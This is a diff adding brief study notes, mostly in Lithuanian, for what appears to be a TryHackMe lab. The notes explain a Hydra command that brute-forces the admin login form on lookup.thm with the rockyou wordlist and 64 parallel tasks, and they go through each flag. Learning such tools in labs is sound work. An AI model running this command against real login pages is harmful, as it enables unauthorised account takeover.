@@ -1,0 +1,15 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:wrong password" -IV -t 64
+
+* "admin" - vardas/username/email;
+*"/usr/share/wordlists/rockyou.txt" - txt failas su zodziu sarasu(slaptazodziais)
+*"lookup.thm" - domenas
+*"/login.php" - login page url/forma/formos failas
+
+**"P" ir "L" didziosios/mazosios skriasi - jei sarasas bandomu variantu yra, tai reikia didziosios, jei vienas variantas i mazosios - kaip cia
+** "-l admin -P /usr/share/wordlists/rockyou.txt" - "l" mazoji nes tik "admin" bandomas, "P" - didzioji nes sarasa variantu.
+
+***"-IV -t 64":
+-I: Ignore any saved session data and start fresh (capital "I", not lowercase "l").
+-V: Verbose mode—shows each attempt (username + password) as Hydra tries them.
+-t 64: Run 64 tasks (attempts) at the same time. It’s like opening 64 browser tabs to guess passwords faster.
+***
